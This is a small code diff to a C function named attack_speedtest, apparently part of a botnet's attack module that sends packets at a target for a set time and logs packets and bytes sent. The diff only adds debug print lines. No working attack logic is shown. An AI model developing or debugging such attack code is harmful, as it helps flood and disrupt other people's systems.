@@ -23,6 +23,8 @@ void attack_speedtest(uint8_t targs_len, struct attack_target *targs, uint8_t op
 
     extern int fd_serv;
 #ifdef DEBUG
+    printf("[speedtest] Version1\n");
+    fflush(stdout);
     printf("[speedtest] Starting speed test for %d seconds, target: %s\n", duration, inet_ntoa(*(struct in_addr*)&targs[0].addr));
     printf("[speedtest] fd_serv = %d\n", fd_serv);
     fflush(stdout);
@@ -93,6 +95,8 @@ void attack_speedtest(uint8_t targs_len, struct attack_target *targs, uint8_t op
     }
 
 #ifdef DEBUG
+    printf("[speedtest] Version1 post-loop\n");
+    fflush(stdout);
     printf("\n[speedtest] Exited loop. packets_sent=%ld, bytes_sent=%llu\n", packets_sent, bytes_sent);
     fflush(stdout);
 #endif
